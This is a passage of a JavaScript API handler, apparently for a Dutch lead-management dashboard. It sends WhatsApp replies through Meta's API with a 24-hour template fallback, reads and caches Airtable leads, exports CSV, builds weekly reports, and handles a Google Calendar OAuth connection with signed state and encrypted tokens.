    // Works identically whether the lead is AI-paused or not — pausing only
    // stops api/whatsapp.js's processMessage() from calling the AI; it never
    // gates a human's own reply sent from here.
    try {
      const qs     = (req.url || '').split('?')[1] || '';
      const params = new URLSearchParams(qs);
      const recordId = params.get('id') || '';

      if (!/^rec[A-Za-z0-9]{14}$/.test(recordId)) {
        return res.status(400).json({ error: 'Ongeldig record ID' });
      }

      const message = String(body.message || '').trim().slice(0, 2000);
      if (!message) return res.status(400).json({ error: 'Bericht is leeg' });

      // Fetch the lead. Verify it belongs to the authenticated client (security)
      const lRes = await atFetch(
        `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
        { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
      );
      if (!lRes.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
      const lead = await lRes.json();
      const leadProject = lead.fields?.['fldSmczuyUJd26HLe'] || lead.fields?.['Project Code'] || '';
      if (!projectCode || leadProject !== projectCode) {
        return res.status(403).json({ error: 'Geen toegang tot deze lead' });
      }
      const phone = lead.fields?.['fld6YaitW0lMqHUrd'] || lead.fields?.['Phone'] || '';
      if (!phone) return res.status(400).json({ error: 'Lead heeft geen telefoonnummer' });

      // Load conversation history up front — needed both for the 24h window
      // check below and to append the reply after sending.
      let history = [];
      const stored = lead.fields?.['Conversation History'];
      if (stored) { try { history = JSON.parse(stored); } catch {} }

      // ── Meta 24h customer-service window ──────────────────────────────────
      // Freeform messages are only allowed within 24h of the lead's last
      // inbound message — the same policy api/cron-followup.js's follow-up
      // loop and this file's appointment-create/sendAppointmentConfirmation
      // already respect (see FOLLOWUP_TEMPLATE_NAME / BOOKING_TEMPLATE_NAME).
      // A manually typed reply can't be squeezed into a fixed, pre-approved
      // template body (templates only take name/date-style variables, never
      // free text), so outside the window we send an approved generic
      // re-engagement template INSTEAD of the typed text when one is
      // configured, and refuse with a clear error otherwise — exactly the
      // "MUST use an approved template or refuse" contract this feature
      // calls for. Never risk the shared WhatsApp number.
      //
      // `ts` on user-role history entries is only stamped going forward (see
      // api/whatsapp.js's processMessage). Conversations that predate this
      // change have no `ts` on their inbound entries — we can't prove those
      // are inside the window, so unknown fails closed (treated as expired)
      // rather than assuming freeform is still safe.
      let lastInboundTs = null;
      for (let i = history.length - 1; i >= 0; i--) {
        const m = history[i];
        if (m && m.role === 'user' && typeof m.ts === 'number') { lastInboundTs = m.ts; break; }
      }
      const hoursSinceInbound = lastInboundTs !== null ? (Date.now() - lastInboundTs) / 3_600_000 : null;
      const withinWindow = hoursSinceInbound !== null && hoursSinceInbound < 24;

      // Per-client sender number (multitenancy prep) — see the test-message
      // mode above for the full comment; same fallback contract here.
      const clientPnid      = await getClientWaPhoneNumberId(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
      const PHONE_NUMBER_ID = clientPnid || process.env.PHONE_NUMBER_ID;
      const WHATSAPP_TOKEN  = process.env.WHATSAPP_TOKEN;
      if (!PHONE_NUMBER_ID || !WHATSAPP_TOKEN) {
        return res.status(500).json({ error: 'WhatsApp configuratie ontbreekt op de server' });
      }

      let viaTemplate = false;
      if (!withinWindow) {
        // MANUAL_REPLY_TEMPLATE_NAME lets an operator configure a dedicated
        // re-engagement template for this flow; falls back to the same
        // FOLLOWUP_TEMPLATE_NAME cron-followup.js already uses so no extra
        // Meta approval is required to get this working.
        const TEMPLATE_NAME = process.env.MANUAL_REPLY_TEMPLATE_NAME || process.env.FOLLOWUP_TEMPLATE_NAME;
        // Resolved against Meta's actually-approved template languages
        // (nl/fr/en today) — see _lang.resolveTemplateLanguage()'s header.
        const TEMPLATE_LANG = _lang.resolveTemplateLanguage(
          process.env.MANUAL_REPLY_TEMPLATE_LANG || process.env.FOLLOWUP_TEMPLATE_LANG || 'nl', 'nl'
        ).code;
        if (!TEMPLATE_NAME) {
          return res.status(409).json({
            error: 'Het 24u WhatsApp-venster is verlopen (of onbekend) sinds het laatste bericht van deze lead. Een vrij bericht versturen kan het gedeelde WhatsApp-nummer laten blokkeren door Meta. Configureer FOLLOWUP_TEMPLATE_NAME (of MANUAL_REPLY_TEMPLATE_NAME) met een goedgekeurde template, of wacht tot de lead opnieuw schrijft.'
          });
        }
        const leadNameForTpl  = lead.fields?.['fldbk0LVNckOU0bqA'] || lead.fields?.['Name'] || '';
        const firstNameForTpl = String(leadNameForTpl).trim().split(' ')[0] || '';
        const tplSent = await sendWATemplate(phone, TEMPLATE_NAME, TEMPLATE_LANG, [firstNameForTpl], PHONE_NUMBER_ID, WHATSAPP_TOKEN);
        if (!tplSent) return res.status(502).json({ error: 'Versturen van goedgekeurde template mislukt.' });
        viaTemplate = true;
      } else {
        // Send WhatsApp via Meta Graph API (inside the 24h window: freeform is safe)
        const waRes = await fetch(`https://graph.facebook.com/v19.0/${PHONE_NUMBER_ID}/messages`, {
          method:  'POST',
          headers: { Authorization: `Bearer ${WHATSAPP_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ messaging_product: 'whatsapp', to: phone, type: 'text', text: { body: message } })
        });
        const waData = await waRes.json().catch(() => ({}));
        if (!waRes.ok || waData.error) {
          console.error('[leads reply] WhatsApp send failed:', JSON.stringify(waData.error || waData));
          return res.status(502).json({ error: 'WhatsApp versturen mislukt', details: waData.error?.message || 'onbekend' });
        }
      }

      // Append to Conversation History so dashboard shows it immediately.
      // Use role 'assistant' with a 'manual:true' marker so we can style it
      // differently. When sent via template instead of the typed text, mark
      // it so the dashboard never claims the lead received words they didn't.
      history.push(viaTemplate
        ? { role: 'assistant', content: message, manual: true, template: true, ts: Date.now() }
        : { role: 'assistant', content: message, manual: true, ts: Date.now() });
      if (history.length > 50) history = history.slice(-50);

      // A human just replied — clear any 'escalated' marker api/whatsapp.js
      // set, so the takeover widget stops flagging a lead that's now handled.
      // Merge-based (never overwrite): preserves notes/tasks/calls/afspraak/
      // waFailed/aiPaused exactly like the ai-pause/ai-resume modes above.
      const rawNotitiesForClear = lead.fields?.['fldoLRI5W12ThTls7'] || lead.fields?.['Notities'] || '';
      const clearedNotities = mergeNotitiesPatch(rawNotitiesForClear, { escalated: undefined });

      const updateRes = await atFetch(
        `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
        {
          method:  'PATCH',
          headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ fields: { 'Conversation History': JSON.stringify(history), fldoLRI5W12ThTls7: clearedNotities } })
        }
      );
      if (!updateRes.ok) {
        console.warn('[leads reply] history update failed (message was sent)', updateRes.status);
      }
      return res.status(200).json({ ok: true, history, viaTemplate });
    } catch (err) {
      console.error('POST reply error:', err.message);
      return res.status(500).json({ error: 'Serverfout. Probeer opnieuw' });
    }
  }

  if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });

  // ── GET. Fetch all leads (paginated) ───────────────────────────────────────
  // Try cache first. On 429 we return stale payload so the dashboard stays alive.
  const leadsCache = getCachedLeads(projectCode);
  const cacheAge   = leadsCache ? Date.now() - leadsCache.ts : Infinity;

  let allLeads = [];
  let usedStale = false;
  try {
    // Use field ID (fldSmczuyUJd26HLe = Project Code). field IDs are stable,
    // field names can be renamed in Airtable without breaking the query.
    const formula = encodeURIComponent(`{fldSmczuyUJd26HLe}="${escapeFormula(projectCode)}"`);
    let offset    = '';
    do {
      // Do NOT use returnFieldsByFieldId=true here. Airtable returns field names
      // as response keys by default, and two fields (Conversation History, Last
      // Message) have no known field IDs.  Filter formula and sort still use field
      // IDs. Those work regardless of this parameter.
      const url  = `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}?filterByFormula=${formula}&sort[0][field]=fldR0r13EU4RwrtvH&sort[0][direction]=desc&pageSize=100${offset ? '&offset=' + offset : ''}`;
      // Single-shot fetch. NO retries.  Retrying on 429 causes overlapping
      // bursts from multiple sessions that keep Airtable permanently limited.
      // On 429 we fall through to the stale cache immediately.
      const lRes = await fetch(url, { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } });
      if (lRes.status === 429) {
        const retryAfter = lRes.headers.get('retry-after') || '?';
        const body429    = await lRes.text().catch(() => '');
        // Airtable now returns {"errors":[{"error":"RATE_LIMIT_REACHED",...}]}
        let errType = '?';
        try { const p = JSON.parse(body429); errType = p?.errors?.[0]?.error || p?.error?.type || p?.type || '?'; } catch {}
        console.warn('[leads] 429 retryAfter=' + retryAfter + ' type=' + errType);
        if (leadsCache && cacheAge < MAX_STALE_MS) {
          console.warn('[leads] 429. serving stale cache (age ' + Math.round(cacheAge / 1000) + 's)');
          usedStale = true;
          break;
        }
        console.warn('[leads] 429. no usable cache, returning empty payload');
        return res.status(200).json({
          leads: [], stats: { total:0, qualified:0, booked:0, conversionRate:0, thisMonth:0, avgResponseTime:0, avgLeadScore:0 },
          client: { naam: clientName, calendly: calendlyLink }, rateLimited: true
        });
      }
      const lData = await lRes.json();
      if (!lRes.ok) {
        console.error(`[leads] Airtable ${lRes.status}:`, JSON.stringify(lData).slice(0, 300));
        throw new Error('Airtable ' + lRes.status);
      }
      allLeads = allLeads.concat(lData.records || []);
      offset   = lData.offset || '';
    } while (offset);
  } catch (err) {
    console.error('Leads fetch error:', err.message);
    if (leadsCache && cacheAge < MAX_STALE_MS) {
      console.warn('Leads error. Serving stale cache as fallback (age ' + Math.round(cacheAge / 1000) + 's)');
      return res.status(200).json({ ...leadsCache.payload, stale: true });
    }
    // Unknown error, no usable cache. Return empty rather than 500 so the dashboard
    // stays alive and retries on the next poll cycle.
    console.warn('Leads error, no usable cache. Returning empty payload');
    return res.status(200).json({
      leads: [], stats: { total:0, qualified:0, booked:0, conversionRate:0, thisMonth:0, avgResponseTime:0, avgLeadScore:0 },
      client: { naam: clientName, calendly: calendlyLink }, error: err.message
    });
  }

  // Serve stale cache when 429 was hit mid-pagination
  if (usedStale) {
    return res.status(200).json({ ...leadsCache.payload, stale: true });
  }

  // ── Field helpers ───────────────────────────────────────────────────────────
  function str(v)  { if (!v) return ''; if (typeof v === 'object' && v.name) return v.name; return String(v); }
  function bool(v) { return v === true || v === 1; }
  function num(v)  { return typeof v === 'number' ? v : parseFloat(v) || 0; }

  const leads = allLeads.map(r => {
    const f = r.fields;
    return {
      id:                    r.id,
      naam:                  f.fldbk0LVNckOU0bqA          || f.Name                    || '',
      telefoon:              f.fld6YaitW0lMqHUrd           || f.Phone                   || '',
      status:                str(f.fld8mkrEWcyq7mUip       || f['Conversation State']),
      qualified:             bool(f.fld0hAZJ5wgaXrNTn      || f.Qualified),
      reden:                 f.fld3NhSENma0okbT7           || f.Reason                  || '',
      samenvatting:          f.fldqerIiw5qyQjXHr           || f['AI Summary']           || '',
      capaciteit:            str(f.fldrfbTopJvZEYSKP        || f.Ability),
      urgentie:              str(f.fldlyLH1DKrWyG3Tr        || f.Urgency),
      fit:                   str(f.fldqNxsPshvZEBeLr        || f.Fit),
      bron:                  str(f.fldGoerozqdea4BfU        || f.Bron),
      boekingslinkVerstuurd: bool(f.fldLeEqwNefdglLis       || f['Booking Link Sent']),
      afspraakGeboekt:       bool(f.fldyIGNetqcSEkoaK       || f['Appointment Booked']),
      notities:              f.fldoLRI5W12ThTls7            || f.Notities               || '',
      gesprek:               f['Conversation History']       || '',
      leadScore:             num(f.fldpzQgMuWJLjogiD        || f['Lead Score']),
      opgepikt:              bool(f.fld86JQHB6dbuutA7       || f.Opgepikt),
      verwachteWaarde:       f.fldv7qOYvCN1xJfiR            || f['Verwachte Waarde']    || '',
      reactietijd:           num(f.fldUJJ8oSmAMQ9wB3        || f['Response Time (sec)']),
      datum:                 f.fldR0r13EU4RwrtvH            || f['Created At']          || r.createdTime || ''
    };
  });

  // ── Stats ───────────────────────────────────────────────────────────────────
  const now            = new Date();
  const total          = leads.length;
  const qualified      = leads.filter(l => l.qualified).length;
  const booked         = leads.filter(l => l.afspraakGeboekt).length;
  const conversionRate = total > 0 ? Math.round((booked / total) * 1000) / 10 : 0;
  const thisMonth      = leads.filter(l => {
    const d = new Date(l.datum);
    return d.getFullYear() === now.getFullYear() && d.getMonth() === now.getMonth();
  }).length;
  const times          = leads.map(l => l.reactietijd).filter(v => v > 0);
  const avgResponseTime = times.length > 0
    ? Math.round((times.reduce((a, b) => a + b, 0) / times.length) * 10) / 10
    : 0;
  const avgLeadScore   = leads.length > 0
    ? Math.round(leads.reduce((a, l) => a + (l.leadScore || 0), 0) / leads.length)
    : 0;
  const stats = { total, qualified, booked, conversionRate, thisMonth, avgResponseTime, avgLeadScore };

  // ── Query params ────────────────────────────────────────────────────────────
  const qs     = (req.url || '').split('?')[1] || '';
  const params = new URLSearchParams(qs);

  // CSV export
  if (params.get('export') === 'true') {
    const esc  = v => '"' + csvFormulaGuard(String(v || '')).replace(/"/g, '""') + '"';
    const hdrs = ['Naam','Telefoon','Status','Gekwalificeerd','Bron','Score','Urgentie','Capaciteit','Fit','Verwachte Waarde','Datum','Samenvatting'];
    const rows = leads.map(l => [
      l.naam, l.telefoon, l.status, l.qualified ? 'Ja' : 'Nee',
      l.bron, l.leadScore, l.urgentie, l.capaciteit, l.fit,
      l.verwachteWaarde,
      l.datum ? new Date(l.datum).toLocaleDateString('nl-BE') : '',
      l.samenvatting
    ].map(esc).join(';'));
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename=helvaro-leads.csv');
    return res.status(200).send([hdrs.join(';'), ...rows].join('\n'));
  }

  // Weekly rapport
  if (params.get('rapport') === 'week') {
    const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
    const wLeads  = leads.filter(l => l.datum && new Date(l.datum) >= sevenDaysAgo);
    const wTotal  = wLeads.length;
    const wQual   = wLeads.filter(l => l.qualified).length;
    const wBooked = wLeads.filter(l => l.afspraakGeboekt).length;
    const wConv   = wTotal > 0 ? Math.round((wBooked / wTotal) * 1000) / 10 : 0;
    const mn  = ['jan','feb','mrt','apr','mei','jun','jul','aug','sep','okt','nov','dec'];
    const van = `${sevenDaysAgo.getDate()} ${mn[sevenDaysAgo.getMonth()]}`;
    const tot = `${now.getDate()} ${mn[now.getMonth()]} ${now.getFullYear()}`;
    // Warm the 429-fallback cache so the regular dashboard view benefits
    // even when the most recent request to leads.js was a rapport request.
    setCachedLeads(projectCode, { leads, stats, client: { naam: clientName, calendly: calendlyLink } });
    return res.status(200).json({
      rapport: {
        periode:              `${van} - ${tot}`,
        totaalLeads:          wTotal,
        gekwalificeerd:       wQual,
        afspraken:            wBooked,
        conversie:            wConv,
        gekwalificeerdeLijst: wLeads.filter(l => l.qualified)
          .map(l => ({ naam: l.naam, telefoon: l.telefoon, samenvatting: l.samenvatting, leadScore: l.leadScore }))
      },
      leads, stats, client: { naam: clientName, calendly: calendlyLink }
    });
  }

  const responsePayload = { leads, stats, client: { naam: clientName, calendly: calendlyLink } };
  setCachedLeads(projectCode, responsePayload); // warm cache for 429 fallback

  // Cache the response at the browser level so all open tabs share one response
  // for 2 minutes instead of each hitting Airtable independently.
  // Vary: x-api-key ensures different users never share each other's cached data.
  res.setHeader('Cache-Control', 'private, max-age=120');
  res.setHeader('Vary', 'x-api-key');
  return res.status(200).json(responsePayload);
};

// Escape double-quotes and backslashes for Airtable formula strings
function escapeFormula(val) {
  return String(val || '').replace(/\\/g, '\\\\').replace(/"/g, '\\"');
}

// ── Per-client WhatsApp sender number (multitenancy prep) ──────────────────
// Resolves which Phone Number ID to send FROM for a given client. Blank on
// every client today (single shared WhatsApp Business number) — returns ''
// in that case, and every call site here falls back to the shared
// PHONE_NUMBER_ID env var exactly like before. This indirection is what lets
// a future per-client Meta Tech Provider / Embedded Signup number become a
// config change instead of a rewrite later (Tech Provider enrolment itself
// is explicitly out of scope for now — see the multitenancy-prep brief).
// fldbrhlSrsmlJwcYr = WhatsApp Phone Number ID field on Client Config
// (tblPidTrwGRzRt4LZ). Mirrors api/whatsapp.js's F_WA_PHONE_NUMBER_ID.
const F_WA_PHONE_NUMBER_ID = 'fldbrhlSrsmlJwcYr';
const _waPnidCache = new Map();
const WA_PNID_TTL  = 5 * 60 * 1000;
async function getClientWaPhoneNumberId(projectCode, airtableToken, baseId, clientsTable) {
  if (!projectCode) return '';
  const cached = _waPnidCache.get(projectCode);
  if (cached && Date.now() - cached.ts < WA_PNID_TTL) return cached.value;
  try {
    const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
    const r = await atFetch(
      `https://api.airtable.com/v0/${baseId}/${clientsTable}?filterByFormula=${formula}&maxRecords=1`,
      { headers: { Authorization: `Bearer ${airtableToken}` } }
    );
    if (!r.ok) return '';
    const rec   = ((await r.json()).records || [])[0];
    const value = (rec && rec.fields && (rec.fields[F_WA_PHONE_NUMBER_ID] || rec.fields['WhatsApp Phone Number ID'])) || '';
    _waPnidCache.set(projectCode, { value, ts: Date.now() });
    return value;
  } catch (e) {
    console.error('[WhatsApp] client phone-number-id lookup mislukt (valt terug op gedeeld nummer):', e && e.message);
    return '';
  }
}

// ── Google Calendar access for a project (optional, fail-soft) ────────────────
// Looks up the client's Klanten record, decrypts their stored refresh token, and
// returns a live access token. Returns { token: '' } if not connected/configured
// — every caller treats an empty token as "no Google", never as an error.
// Field IDs: fldkYmK3jAabvytCF = Google Refresh Token, fldWBxxhGYEZNIMqA =
// Google Calendar ID (both verified against the live Airtable base; name
// fallback kept for defense-in-depth, matching this file's existing convention).
async function gcalAccessForProject(projectCode, airtableToken, baseId, clientsTable) {
  try {
    if (!_gcal.isConfigured() || !projectCode) return { token: '', calId: 'primary' };
    const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
    const r = await atFetch(
      `https://api.airtable.com/v0/${baseId}/${clientsTable}?filterByFormula=${formula}&maxRecords=1`,
      { headers: { Authorization: `Bearer ${airtableToken}` } }
    );
    if (!r.ok) return { token: '', calId: 'primary' };
    const rec = ((await r.json()).records || [])[0];
    const enc = rec && rec.fields && (rec.fields['fldkYmK3jAabvytCF'] || rec.fields['Google Refresh Token']);
    if (!enc) return { token: '', calId: 'primary' };
    const refresh = _gcal.decryptToken(enc);
    if (!refresh) return { token: '', calId: 'primary' };
    const token = await _gcal.getAccessToken(refresh);
    const calId = rec.fields['fldWBxxhGYEZNIMqA'] || rec.fields['Google Calendar ID'] || 'primary';
    return { token, calId };
  } catch (e) { console.error('[gcal] access-for-project failed:', e && e.message); return { token: '', calId: 'primary' }; }
}

// ── Google Calendar OAuth handler (folded in from the former api/gcal.js) ──────
// Reached via the /api/gcal -> /api/leads?__gcal=1 rewrite (vercel.json).
// Modes (all POST, authenticated via the same signed session token every other
// dashboard request sends in x-api-key — see verifySession() above):
//   {mode:'connect'}    -> { url } the caller redirects the browser to (Google
//                          consent screen). We deliberately return the URL
//                          instead of doing a 302 ourselves: a bare GET
//                          navigation here has no way to carry the caller's
//                          x-api-key header (this app has no auth cookie), so
//                          the SPA fetches this authenticated endpoint first,
//                          then does `window.location.href = url` itself. The
//                          session token therefore never travels in any URL.
//   {mode:'status'}     -> { configured, connected, email }
//   {mode:'disconnect'} -> clears the stored refresh token + email
// Plus two GET-only steps Google itself calls, unauthenticated by us — trust
// is established purely through the signed, short-TTL `state` param:
//   ?action=callback    -> Google's redirect back after consent. Exchanges the
//                          code, encrypts + stores the refresh token, 302s back
//                          to the dashboard with a `?gcal=...` status flag.
const GCAL_STATE_TTL_MS = 10 * 60 * 1000;
const GCAL_CLIENTS_TABLE = 'tblPidTrwGRzRt4LZ';
const GCAL_F_PROJECT = 'fldN4dL0bGgfBOXwM';
const GCAL_F_REFRESH = 'fldkYmK3jAabvytCF';   // Google Refresh Token (encrypted at rest)
const GCAL_F_GEMAIL  = 'fldXF7qdyHYnSjnGf';   // Google Calendar Email
const GCAL_F_CALID   = 'fldWBxxhGYEZNIMqA';   // Google Calendar ID

function gcalSignState(projectCode) {
  const payload = Buffer.from(JSON.stringify({ p: projectCode, t: Date.now() })).toString('base64url');
  const sig = crypto.createHmac('sha256', sessionSecret()).update(payload).digest('base64url');
  return `${payload}.${sig}`;
}
function gcalVerifyState(state) {
  try {
    const [payload, sig] = String(state || '').split('.');
    if (!payload || !sig) return '';
    const expected = crypto.createHmac('sha256', sessionSecret()).update(payload).digest('base64url');
    const a = Buffer.from(sig, 'base64url'), b = Buffer.from(expected, 'base64url');
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return '';
    const data = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    if (!data.p || !data.t || Date.now() - data.t > GCAL_STATE_TTL_MS) return '';
    return data.p;
  } catch { return ''; }
}
async function gcalGetClient(projectCode) {
  const BASE_ID = process.env.BASE_AIRTABLE, TOKEN = process.env.API_AIRTABLE;
  const formula = encodeURIComponent(`{${GCAL_F_PROJECT}}="${escapeFormula(projectCode)}"`);
  const r = await atFetch(`https://api.airtable.com/v0/${BASE_ID}/${GCAL_CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
    { headers: { Authorization: `Bearer ${TOKEN}` } });
  if (!r.ok) return null;
  return ((await r.json()).records || [])[0] || null;
}
async function gcalPatchClient(recordId, fields) {
  const BASE_ID = process.env.BASE_AIRTABLE, TOKEN = process.env.API_AIRTABLE;
  return atFetch(`https://api.airtable.com/v0/${BASE_ID}/${GCAL_CLIENTS_TABLE}/${recordId}`, {
    method: 'PATCH', headers: { Authorization: `Bearer ${TOKEN}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ fields, typecast: true }),
  });
}
function gcalRedirect(res, url) { res.statusCode = 302; res.setHeader('Location', url); res.end(); }

async function handleGcal(req, res) {
  if (!_gcal.isConfigured()) {
    if (req.method === 'GET') return gcalRedirect(res, '/dashboard?gcal=unconfigured');
    return res.status(200).json({ connected: false, configured: false });
  }
  const url    = new URL(req.url, 'https://app.helvaro.pro');
  const action = url.searchParams.get('action') || '';

  // Google's OAuth callback. No x-api-key here (Google doesn't send it) — the
  // caller's identity comes entirely from the signed, TTL-limited `state`
  // param we minted in mode:'connect' below (CSRF protection: an attacker
  // cannot forge a valid state without SESSION_SECRET/ADMIN_KEY).
  if (req.method === 'GET' && action === 'callback') {
    if (url.searchParams.get('error')) return gcalRedirect(res, '/dashboard?gcal=denied');
    const code = url.searchParams.get('code');
    const projectCode = gcalVerifyState(url.searchParams.get('state'));
    if (!code || !projectCode) return gcalRedirect(res, '/dashboard?gcal=invalid_state');
    try {
      const { refreshToken, email } = await _gcal.exchangeCode(code);
      if (!refreshToken) {
        // Google didn't return a refresh token (e.g. offline access wasn't
        // actually granted). Fail closed: never mark "connected" without one.
        console.error('[gcal callback] no refresh_token in response for', projectCode);
        return gcalRedirect(res, '/dashboard?gcal=error');
      }
      const client = await gcalGetClient(projectCode);
      if (!client) return gcalRedirect(res, '/dashboard?gcal=client_not_found');
      // encryptToken() throws if no encryption key is configured — caught
      // below, which fails the connection closed (never stores plaintext).
      const encrypted = _gcal.encryptToken(refreshToken);
      await gcalPatchClient(client.id, {
        [GCAL_F_REFRESH]: encrypted,
        [GCAL_F_GEMAIL]:  email || '',
        [GCAL_F_CALID]:   'primary',
      });
      return gcalRedirect(res, '/dashboard?gcal=connected');
    } catch (e) {
      console.error('[gcal callback]', e && e.message);
      return gcalRedirect(res, '/dashboard?gcal=error');
    }
  }

  if (req.method === 'POST') {
    // Authenticate via the same signed session token every other dashboard
    // request sends. Deliberately does NOT accept the legacy raw API-key path
    // (Path B in the main handler above) — a brand-new OAuth-touching feature
    // fails closed rather than extend trust to older, unsigned tokens.
    const raw = String(req.headers['x-api-key'] || '').trim().slice(0, 2048);
    const session = verifySession(raw);
    const projectCode = session && session.projectCode ? session.projectCode : '';
    if (!projectCode) return res.status(401).json({ error: 'Niet ingelogd' });

    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    body = body || {};

    if (body.mode === 'connect') {
      return res.status(200).json({ url: _gcal.getAuthUrl(gcalSignState(projectCode)) });
    }
    if (body.mode === 'status') {
      try {
        const client = await gcalGetClient(projectCode);
        const f = (client && client.fields) || {};
        const connected = !!(f[GCAL_F_REFRESH] || f['Google Refresh Token']);
        const email = f[GCAL_F_GEMAIL] || f['Google Calendar Email'] || '';
        return res.status(200).json({ configured: true, connected, email });
      } catch (e) {
        console.error('[gcal status]', e && e.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }
    if (body.mode === 'disconnect') {
      try {
        const client = await gcalGetClient(projectCode);
        if (client) await gcalPatchClient(client.id, { [GCAL_F_REFRESH]: '', [GCAL_F_GEMAIL]: '' });
        return res.status(200).json({ ok: true, connected: false });
      } catch (e) {
        console.error('[gcal disconnect]', e && e.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }
    return res.status(400).json({ error: 'Onbekende mode' });
  }
  return res.status(405).json({ error: 'Method not allowed' });
}

// Merge arbitrary top-level keys into a lead's Notities JSON envelope without
// clobbering existing notes/tasks/calls/afspraak — including legacy plain-text
// notes that predate the JSON envelope. Mirrors api/whatsapp.js's
// mergeWaFailedFlag (same file-local-helper convention already used across
// this codebase for Notities merging, rather than a shared module) — see its
// doc comment for why merge-not-overwrite matters here.
// Any key in `patch` set to `undefined` is DELETED from the envelope (used to
// clear aiPaused/escalated); every other key is merged in as-is.
function mergeNotitiesPatch(raw, patch) {
  const trimmed = raw ? String(raw).trim() : '';
  let data    = { _v: 1, notes: [], tasks: [], calls: [] };
  let handled = false;
  if (trimmed.startsWith('{')) {
    try {
      const parsed = JSON.parse(trimmed);
      if (parsed && typeof parsed === 'object') { data = { ...data, ...parsed }; handled = true; }
    } catch { /* malformed JSON: fall through, preserve as legacy text below */ }
  }
  if (!handled && trimmed) {
    data.notes = [{ id: 'legacy', text: trimmed, ts: new Date().toISOString() }];
  }
  for (const [k, v] of Object.entries(patch || {})) {
    if (v === undefined) delete data[k];
    else data[k] = v;
  }
  return JSON.stringify(data);
}

// ── Reporting period boundaries (report-summary mode) ────────────────────────
// All boundaries computed in UTC epoch ms so results don't depend on the
// Vercel function's local timezone. "this_month" compares the current
// calendar month against the PRIOR calendar month (not a rolling 30 days),
// so the trend delta means what it says. "last_30_days" is a rolling window
// compared against the 30 days immediately before it. "all_time" has no
// meaningful previous period to compare against.
function reportPeriodBounds(period) {
  const now = new Date();
  if (period === 'last_30_days') {
    const DAY = 24 * 60 * 60 * 1000;
    const currentEnd    = now.getTime();
    const currentStart  = currentEnd - 30 * DAY;
    const previousEnd    = currentStart;
    const previousStart  = previousEnd - 30 * DAY;
    return { currentStart, currentEnd, previousStart, previousEnd, hasPrevious: true, label: 'Afgelopen 30 dagen' };
  }
  if (period === 'all_time') {
    return { currentStart: 0, currentEnd: now.getTime(), previousStart: 0, previousEnd: 0, hasPrevious: false, label: 'Alle tijd' };
  }
  // this_month (default). Date.UTC handles the year rollover for January
  // automatically (month -1 becomes December of the previous year).
  const y = now.getUTCFullYear(), m = now.getUTCMonth();
  const currentStart   = Date.UTC(y, m, 1);
  const currentEnd     = now.getTime();
  const previousStart  = Date.UTC(y, m - 1, 1);
  const previousEnd    = currentStart;
  return { currentStart, currentEnd, previousStart, previousEnd, hasPrevious: true, label: 'Deze maand' };
}

// True only for Airtable checkbox fields that are actually checked. Mirrors
// the GET path's bool() helper above (v === true || v === 1) since this
// aggregation reads raw Airtable records directly rather than the mapped
// `leads` array (GET-only), to distinguish "field absent" from "field is 0"
// for the averages below.
function isChecked(v) { return v === true || v === 1; }

// Aggregate honest reporting stats for one window [startMs, endMs) of raw
// Airtable lead records. Missing fields degrade to null (never a misleading
// 0) so the UI/email can render "geen data" instead of a fabricated number.
function aggregateReportPeriod(records, startMs, endMs) {
  const inWindow = records.filter(r => {
    const raw = r.fields?.['fldR0r13EU4RwrtvH'] || r.fields?.['Created At'] || r.createdTime;
    const t = new Date(raw).getTime();
    return !isNaN(t) && t >= startMs && t < endMs;
  });

  const total = inWindow.length;
  const qualifiedCount = inWindow.filter(r => isChecked(r.fields?.['fld0hAZJ5wgaXrNTn'] ?? r.fields?.['Qualified'])).length;
  const bookedCount    = inWindow.filter(r => isChecked(r.fields?.['fldyIGNetqcSEkoaK'] ?? r.fields?.['Appointment Booked'])).length;

  // Pipeline value: "Verwachte Waarde" is a free-text, client-entered
  // ESTIMATE (fldv7qOYvCN1xJfiR). Only leads where the client actually typed
  // a parseable value count toward the sum/average — an empty field is
  // excluded, never treated as €0 (that would silently deflate the average,
  // exactly the bug batch C fixed for the client-side parser this mirrors).
  const dealValues = inWindow
    .map(r => parseDealValueServer(r.fields?.['fldv7qOYvCN1xJfiR'] ?? r.fields?.['Verwachte Waarde'] ?? ''))
    .filter(v => v > 0);
  const pipelineValueTotal = dealValues.length ? Math.round(dealValues.reduce((a, b) => a + b, 0)) : null;
  const pipelineValueAvg   = dealValues.length ? Math.round(dealValues.reduce((a, b) => a + b, 0) / dealValues.length) : null;

  // Lead score: only leads the AI has actually scored (field present as a
  // number). A real score of 0 is possible ("very unqualified"), so presence
  // — not truthiness — is what determines inclusion.
  const scores = inWindow
    .map(r => r.fields?.['fldpzQgMuWJLjogiD'] ?? r.fields?.['Lead Score'])
    .filter(v => typeof v === 'number' && !isNaN(v));
  const avgLeadScore = scores.length ? Math.round((scores.reduce((a, b) => a + b, 0) / scores.length) * 10) / 10 : null;

  // Response time: only leads with a recorded, positive response time.
  const times = inWindow
    .map(r => r.fields?.['fldUJJ8oSmAMQ9wB3'] ?? r.fields?.['Response Time (sec)'])
    .filter(v => typeof v === 'number' && v > 0);
  const avgResponseTime = times.length ? Math.round((times.reduce((a, b) => a + b, 0) / times.length) * 10) / 10 : null;

  return {
